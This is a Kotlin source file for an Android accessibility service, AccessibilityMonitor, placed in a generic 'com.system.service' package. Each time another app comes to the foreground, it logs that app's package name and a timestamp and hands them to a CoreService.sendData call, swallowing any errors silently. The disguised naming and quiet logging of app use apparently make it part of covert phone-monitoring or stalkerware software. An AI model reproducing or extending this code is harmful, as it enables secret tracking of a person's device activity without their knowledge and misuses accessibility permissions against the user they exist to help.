package com.system.service.monitors

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.system.service.core.CoreService
import org.json.JSONObject

class AccessibilityMonitor : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        try {
            val pkg = event.packageName?.toString() ?: return
            if (pkg == packageName) return

            if (event.eventType ==
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {

                val service = CoreService.instance
                service?.sendData("app_open",
                    JSONObject().apply {
                        put("package", pkg)
                        put("time", System.currentTimeMillis())
                    })
            }
        } catch (e: Exception) { }
    }

    override fun onInterrupt() {}
}
